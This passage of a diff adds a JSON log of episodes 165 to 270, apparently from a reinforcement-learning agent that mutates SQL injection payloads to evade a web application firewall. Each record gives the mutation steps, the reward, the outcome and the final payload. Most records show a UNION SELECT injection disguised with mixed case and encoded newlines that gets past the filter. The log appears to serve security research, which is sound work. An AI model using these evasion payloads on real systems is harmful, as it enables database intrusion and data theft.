+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0auNion%0aseLect%0a1,2,'3"
+  },
+  {
+    "episode": 165,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0auNIon%0aseLect%0a1,2,'3"
+  },
+  {
+    "episode": 166,
+    "steps": 15,
+    "total_reward": -39.6,
+    "success": false,
+    "final_result": "WAF_BLOCKED",
+    "sequence": [
+      "case_split",
+      "ver_50000",
+      "comment",
+      "url_encode",
+      "comment",
+      "newline",
+      "vtab",
+      "tab_space",
+      "newline",
+      "crlf",
+      "tab_space",
+      "tab_space",
+      "newline",
+      "comment",
+      "double_encode"
+    ],
+    "final_payload": "0'/**/unION/**/sELEct/**/1,2,'3"
+  },
+  {
+    "episode": 167,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0auNIon%0asELEct%0a1,2,'3"
+  },
+  {
+    "episode": 168,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0auNiOn%0aSeLeCt%0a1,2,'3"
+  },
+  {
+    "episode": 169,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0auNiOn%0asElEcT%0a1,2,'3"
+  },
+  {
+    "episode": 170,
+    "steps": 15,
+    "total_reward": -9.6,
+    "success": false,
+    "final_result": "SQL_ERROR",
+    "sequence": [
+      "between_space",
+      "vtab",
+      "comment",
+      "case_split",
+      "backtick",
+      "case_split",
+      "ver_00000",
+      "comment",
+      "double_encode",
+      "newline",
+      "newline",
+      "tab_space",
+      "newline",
+      "crlf",
+      "newline"
+    ],
+    "final_payload": "0'%a0unION%a0SELEcT%a01,2,'3"
+  },
+  {
+    "episode": 171,
+    "steps": 10,
+    "total_reward": -12.4,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "newline",
+      "formfeed",
+      "comment",
+      "formfeed",
+      "comment",
+      "between_space",
+      "comment",
+      "vtab",
+      "newline",
+      "case_split"
+    ],
+    "final_payload": "0'%0aunION%0aselECT%0a1,2,'3"
+  },
+  {
+    "episode": 172,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0auNiOn%0aselECT%0a1,2,'3"
+  },
+  {
+    "episode": 173,
+    "steps": 15,
+    "total_reward": -39.6,
+    "success": false,
+    "final_result": "WAF_BLOCKED",
+    "sequence": [
+      "case_split",
+      "hash_nl",
+      "case_split",
+      "comment",
+      "comment",
+      "newline",
+      "nested_union",
+      "comment",
+      "tab_space",
+      "comment",
+      "newline",
+      "newline",
+      "comment",
+      "comment",
+      "newline"
+    ],
+    "final_payload": "0'/**/unION%23sqli%0AseLect/**/1,2,'3"
+  },
+  {
+    "episode": 174,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0auNiOn%0aSeLeCt%0a1,2,'3"
+  },
+  {
+    "episode": 175,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case",
+      "formfeed"
+    ],
+    "final_payload": "0'%0cUNioN%0cSElECt%0c1,2,'3"
+  },
+  {
+    "episode": 176,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0aUnIoN%0aselECT%0a1,2,'3"
+  },
+  {
+    "episode": 177,
+    "steps": 15,
+    "total_reward": -39.6,
+    "success": false,
+    "final_result": "WAF_BLOCKED",
+    "sequence": [
+      "paren_space",
+      "tab_space",
+      "comment",
+      "newline",
+      "comment",
+      "tab_space",
+      "comment",
+      "newline",
+      "hex_encode",
+      "comment",
+      "comment",
+      "newline",
+      "comment",
+      "distinct",
+      "comment"
+    ],
+    "final_payload": "0'%09UNION(SELECT%09(1),(2),('3))"
+  },
+  {
+    "episode": 178,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0aunION%0aSeLeCt%0a1,2,'3"
+  },
+  {
+    "episode": 179,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0aUNIoN%0aseLect%0a1,2,'3"
+  },
+  {
+    "episode": 180,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0aUNIoN%0aselECT%0a1,2,'3"
+  },
+  {
+    "episode": 181,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0auNIon%0aselECT%0a1,2,'3"
+  },
+  {
+    "episode": 182,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0aUNIoN%0aSELEcT%0a1,2,'3"
+  },
+  {
+    "episode": 183,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0aUnIoN%0aSeLeCt%0a1,2,'3"
+  },
+  {
+    "episode": 184,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0auNiOn%0aSeLeCt%0a1,2,'3"
+  },
+  {
+    "episode": 185,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0aunION%0asElEcT%0a1,2,'3"
+  },
+  {
+    "episode": 186,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0aunION%0aselECT%0a1,2,'3"
+  },
+  {
+    "episode": 187,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0auNIon%0aSELEcT%0a1,2,'3"
+  },
+  {
+    "episode": 188,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0aUNIoN%0asElEcT%0a1,2,'3"
+  },
+  {
+    "episode": 189,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0aunION%0aSeLeCt%0a1,2,'3"
+  },
+  {
+    "episode": 190,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0aunION%0asELEct%0a1,2,'3"
+  },
+  {
+    "episode": 191,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0aUNIoN%0aseLect%0a1,2,'3"
+  },
+  {
+    "episode": 192,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0auNIon%0asELEct%0a1,2,'3"
+  },
+  {
+    "episode": 193,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0auNion%0asElEcT%0a1,2,'3"
+  },
+  {
+    "episode": 194,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0aunION%0asELEct%0a1,2,'3"
+  },
+  {
+    "episode": 195,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0auNion%0asELEct%0a1,2,'3"
+  },
+  {
+    "episode": 196,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0aUNIoN%0aseLect%0a1,2,'3"
+  },
+  {
+    "episode": 197,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0auNion%0asELEct%0a1,2,'3"
+  },
+  {
+    "episode": 198,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0auNIon%0asELEct%0a1,2,'3"
+  },
+  {
+    "episode": 199,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0auNIon%0aSeLeCt%0a1,2,'3"
+  },
+  {
+    "episode": 200,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0aUnIoN%0aseLect%0a1,2,'3"
+  },
+  {
+    "episode": 201,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0auNIon%0aselECT%0a1,2,'3"
+  },
+  {
+    "episode": 202,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0aunION%0aseLect%0a1,2,'3"
+  },
+  {
+    "episode": 203,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0auNiOn%0aseLect%0a1,2,'3"
+  },
+  {
+    "episode": 204,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0auNiOn%0aSeLeCt%0a1,2,'3"
+  },
+  {
+    "episode": 205,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0aunION%0asELEct%0a1,2,'3"
+  },
+  {
+    "episode": 206,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0aunION%0aSeLeCt%0a1,2,'3"
+  },
+  {
+    "episode": 207,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0auNIon%0aSeLeCt%0a1,2,'3"
+  },
+  {
+    "episode": 208,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0auNIon%0aSeLeCt%0a1,2,'3"
+  },
+  {
+    "episode": 209,
+    "steps": 10,
+    "total_reward": -12.4,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "unhex_wrap",
+      "newline",
+      "between_space",
+      "comment",
+      "plus_sep",
+      "newline",
+      "crlf",
+      "newline",
+      "vtab",
+      "case"
+    ],
+    "final_payload": "0'%0aUNiOn%0aSELEct%0a1,2,'3"
+  },
+  {
+    "episode": 210,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0auNIon%0aSeLeCt%0a1,2,'3"
+  },
+  {
+    "episode": 211,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0auNiOn%0aselECT%0a1,2,'3"
+  },
+  {
+    "episode": 212,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0aUnIoN%0aseLect%0a1,2,'3"
+  },
+  {
+    "episode": 213,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0aUNIoN%0aselECT%0a1,2,'3"
+  },
+  {
+    "episode": 214,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0aUnIoN%0aselECT%0a1,2,'3"
+  },
+  {
+    "episode": 215,
+    "steps": 6,
+    "total_reward": -1.68,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "newline",
+      "plus_sep",
+      "comment",
+      "double_encode",
+      "comment",
+      "case"
+    ],
+    "final_payload": "0'%0auNiOn%0aseLEct%0a1,2,'3"
+  },
+  {
+    "episode": 216,
+    "steps": 15,
+    "total_reward": -39.6,
+    "success": false,
+    "final_result": "WAF_BLOCKED",
+    "sequence": [
+      "case_split",
+      "ver_12345",
+      "newline",
+      "between_space",
+      "comment",
+      "newline",
+      "comment",
+      "formfeed",
+      "comment",
+      "vtab",
+      "newline",
+      "comment",
+      "formfeed",
+      "tab_space",
+      "newline"
+    ],
+    "final_payload": "0'%0a/*!12345UnIoN%0asElEcT*/%0a1,2,'3"
+  },
+  {
+    "episode": 217,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0aUnIoN%0aSELEcT%0a1,2,'3"
+  },
+  {
+    "episode": 218,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0aUNIoN%0aseLect%0a1,2,'3"
+  },
+  {
+    "episode": 219,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0auNIon%0aselECT%0a1,2,'3"
+  },
+  {
+    "episode": 220,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0aunION%0aSeLeCt%0a1,2,'3"
+  },
+  {
+    "episode": 221,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0auNion%0aselECT%0a1,2,'3"
+  },
+  {
+    "episode": 222,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0auNIon%0asElEcT%0a1,2,'3"
+  },
+  {
+    "episode": 223,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0aUNIoN%0aseLect%0a1,2,'3"
+  },
+  {
+    "episode": 224,
+    "steps": 15,
+    "total_reward": -39.6,
+    "success": false,
+    "final_result": "WAF_BLOCKED",
+    "sequence": [
+      "nested_or",
+      "newline",
+      "double_encode",
+      "newline",
+      "crlf",
+      "newline",
+      "formfeed",
+      "comment",
+      "formfeed",
+      "comment",
+      "between_space",
+      "comment",
+      "tab_space",
+      "comment",
+      "crlf"
+    ],
+    "final_payload": "0'%0aUNION%0aSELECT%0a1,2,'3"
+  },
+  {
+    "episode": 225,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0auNiOn%0aselECT%0a1,2,'3"
+  },
+  {
+    "episode": 226,
+    "steps": 15,
+    "total_reward": -39.6,
+    "success": false,
+    "final_result": "WAF_BLOCKED",
+    "sequence": [
+      "case_split",
+      "plus_sep",
+      "tab_space",
+      "newline",
+      "crlf",
+      "newline",
+      "tab_space",
+      "newline",
+      "crlf",
+      "newline",
+      "newline",
+      "tab_space",
+      "comment",
+      "formfeed",
+      "tab_space"
+    ],
+    "final_payload": "0'+uNion+sELEct+1,2,'3"
+  },
+  {
+    "episode": 227,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0aUNIoN%0asELEct%0a1,2,'3"
+  },
+  {
+    "episode": 228,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0auNion%0aseLect%0a1,2,'3"
+  },
+  {
+    "episode": 229,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0aUNIoN%0aSeLeCt%0a1,2,'3"
+  },
+  {
+    "episode": 230,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0aUNIoN%0asElEcT%0a1,2,'3"
+  },
+  {
+    "episode": 231,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0aUNIoN%0asELEct%0a1,2,'3"
+  },
+  {
+    "episode": 232,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0auNIon%0aselECT%0a1,2,'3"
+  },
+  {
+    "episode": 233,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0auNIon%0aseLect%0a1,2,'3"
+  },
+  {
+    "episode": 234,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0aUNIoN%0aselECT%0a1,2,'3"
+  },
+  {
+    "episode": 235,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0auNiOn%0aSELEcT%0a1,2,'3"
+  },
+  {
+    "episode": 236,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0aunION%0aSeLeCt%0a1,2,'3"
+  },
+  {
+    "episode": 237,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0auNIon%0aSeLeCt%0a1,2,'3"
+  },
+  {
+    "episode": 238,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0aUnIoN%0asElEcT%0a1,2,'3"
+  },
+  {
+    "episode": 239,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0auNiOn%0aSELEcT%0a1,2,'3"
+  },
+  {
+    "episode": 240,
+    "steps": 15,
+    "total_reward": -39.6,
+    "success": false,
+    "final_result": "WAF_BLOCKED",
+    "sequence": [
+      "between_space",
+      "formfeed",
+      "hex_encode",
+      "comment",
+      "comment",
+      "newline",
+      "comment",
+      "comment",
+      "newline",
+      "hash_nl_all",
+      "comment",
+      "comment",
+      "comment",
+      "newline",
+      "comment"
+    ],
+    "final_payload": "0'%a0UNION%a0SELECT%a00x31,0x32,'3"
+  },
+  {
+    "episode": 241,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0auNiOn%0asElEcT%0a1,2,'3"
+  },
+  {
+    "episode": 242,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0auNiOn%0aselECT%0a1,2,'3"
+  },
+  {
+    "episode": 243,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0auNIon%0aseLect%0a1,2,'3"
+  },
+  {
+    "episode": 244,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0auNIon%0aseLect%0a1,2,'3"
+  },
+  {
+    "episode": 245,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0auNIon%0aselECT%0a1,2,'3"
+  },
+  {
+    "episode": 246,
+    "steps": 15,
+    "total_reward": -39.6,
+    "success": false,
+    "final_result": "WAF_BLOCKED",
+    "sequence": [
+      "case_split",
+      "ver_12345",
+      "tab_space",
+      "comment",
+      "comment",
+      "newline",
+      "case_split",
+      "case_split",
+      "comment",
+      "comment",
+      "newline",
+      "comment",
+      "case_split",
+      "comment",
+      "comment"
+    ],
+    "final_payload": "0'%09/*!12345uNion%09sElEcT*/%091,2,'3"
+  },
+  {
+    "episode": 247,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0auNiOn%0asELEct%0a1,2,'3"
+  },
+  {
+    "episode": 248,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0aunION%0aseLect%0a1,2,'3"
+  },
+  {
+    "episode": 249,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0auNIon%0aselECT%0a1,2,'3"
+  },
+  {
+    "episode": 250,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0auNion%0asElEcT%0a1,2,'3"
+  },
+  {
+    "episode": 251,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0aunION%0asELEct%0a1,2,'3"
+  },
+  {
+    "episode": 252,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0aunION%0aSELEcT%0a1,2,'3"
+  },
+  {
+    "episode": 253,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0auNiOn%0asElEcT%0a1,2,'3"
+  },
+  {
+    "episode": 254,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0aunION%0aselECT%0a1,2,'3"
+  },
+  {
+    "episode": 255,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0auNIon%0asELEct%0a1,2,'3"
+  },
+  {
+    "episode": 256,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0aUnIoN%0aSELEcT%0a1,2,'3"
+  },
+  {
+    "episode": 257,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0auNiOn%0aselECT%0a1,2,'3"
+  },
+  {
+    "episode": 258,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0aunION%0aSeLeCt%0a1,2,'3"
+  },
+  {
+    "episode": 259,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0aUnIoN%0asElEcT%0a1,2,'3"
+  },
+  {
+    "episode": 260,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0aUnIoN%0asELEct%0a1,2,'3"
+  },
+  {
+    "episode": 261,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0aUnIoN%0asELEct%0a1,2,'3"
+  },
+  {
+    "episode": 262,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0auNion%0aselECT%0a1,2,'3"
+  },
+  {
+    "episode": 263,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0aUNIoN%0asElEcT%0a1,2,'3"
+  },
+  {
+    "episode": 264,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0aunION%0aseLect%0a1,2,'3"
+  },
+  {
+    "episode": 265,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0aunION%0aseLect%0a1,2,'3"
+  },
+  {
+    "episode": 266,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0aUnIoN%0asELEct%0a1,2,'3"
+  },
+  {
+    "episode": 267,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0auNiOn%0asELEct%0a1,2,'3"
+  },
+  {
+    "episode": 268,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0aUNIoN%0aSeLeCt%0a1,2,'3"
+  },
+  {
+    "episode": 269,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0auNIon%0aSELEcT%0a1,2,'3"
+  },
+  {
+    "episode": 270,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
